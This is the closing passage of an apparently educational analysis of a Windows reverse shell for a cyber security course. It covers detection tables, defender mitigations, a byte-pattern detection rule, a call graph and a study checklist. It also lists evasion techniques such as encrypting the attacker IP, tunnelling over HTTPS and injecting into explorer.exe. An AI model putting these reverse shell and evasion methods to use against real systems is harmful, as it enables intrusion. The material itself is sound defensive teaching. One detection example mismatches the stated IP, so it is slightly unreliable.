| Parent/child relationship | Unknown process spawning `cmd.exe` | Behavioural analytics can still flag this |

**Mitigation for defenders:** Enable **Command Line Logging** and **Process Creation Auditing** (Event ID 4688). Even though the command line is plain `"cmd.exe"`, the **parent process name** and the fact that `cmd.exe` inherits a socket handle are suspicious. EDR products with behavioural heuristics flag "network handle inheritance by shell processes."

### 5.3 Memory / Forensic Detection

| Vector | What the Defender Sees | How the Code Avoids It |
|--------|------------------------|------------------------|
| Strings in binary | Hard-coded IP `"192.168.1.92"` | IP is visible in the `.rdata` section unless obfuscated |
| Import table | Imports from `ws2_32.dll` | Common for many apps, but unusual for GUI-subsystem exes with no visible network UI |
| API call sequence | `WSAStartup` → `socket` → `connect` → `CreateProcessA` | Signature-based AV may flag this exact sequence as "Generic Reverse Shell" |

**Mitigation for defenders:** Use **memory scanning** and **import table analysis**. YARA rules can match the byte sequence of `push 0x0100007F` (loopback) + `push 0x901F0000` (port 8080 big-endian) + `call connect`. Even if the author changes the IP, the structural pattern of `socket` → `connect` → `CreateProcessA` with `STARTF_USESTDHANDLES` is highly indicative.

### 5.4 Behavioural Evasion Techniques (Not in This Code, but Relevant)

More advanced variants of this payload might:
- **Encrypt the IP/port** and decrypt at runtime to hide strings.
- **Use IPv6** (`sockaddr_in6`) to bypass simple IPv4 signatures.
- **Use HTTPS** (via `WinHTTP` or `schannel`) to blend into encrypted web traffic.
- **Inject into a legitimate process** (e.g., `explorer.exe`) so the network connection appears to come from a trusted binary.
- **Use `powershell.exe` instead of `cmd.exe`** to avoid spawning the legacy console host.

This basic implementation avoids none of those advanced techniques, making it a textbook example for learning rather than a production-grade red-team tool.

---

## 6. Summary Table: Complete Call Graph

| Function | Purpose | Key Windows APIs Used |
|----------|---------|----------------------|
| `WinMain` | Entry point, orchestration | `WinMain` signature (GUI subsystem) |
| `EstablishChannel` | Create TCP connection to attacker | `WSAStartup`, `socket`, `connect`, `closesocket`, `WSACleanup` |
| `SpawnRemoteSession` | Spawn hidden shell with redirected I/O | `memset`, `CreateProcessA`, `WaitForSingleObject`, `CloseHandle` |

---

## 7. Assessment Checklist

Use this checklist to verify your understanding before submission:

- [ ] I can explain why `winsock2.h` must come before `windows.h`.
- [ ] I can draw the TCP three-way handshake initiated by `connect()`.
- [ ] I can explain the difference between host byte order and network byte order, and why `htons` is necessary.
- [ ] I can describe the fields of `STARTUPINFOA` and why each is set.
- [ ] I can explain why `bInheritHandles` must be `TRUE`.
- [ ] I can explain why `(HANDLE)sock` works on Windows.
- [ ] I can articulate why this is a reverse shell rather than a bind shell.
- [ ] I can list three detection vectors and three corresponding evasion techniques.
- [ ] I can explain the difference between `main` and `WinMain` and why malware authors choose one over the other.

---

*Document generated for educational purposes as part of Cert IV Cyber Security final assessment. This analysis is intended to build defensive analysis skills — understanding how attackers operate is fundamental to building effective detection and response capabilities.*
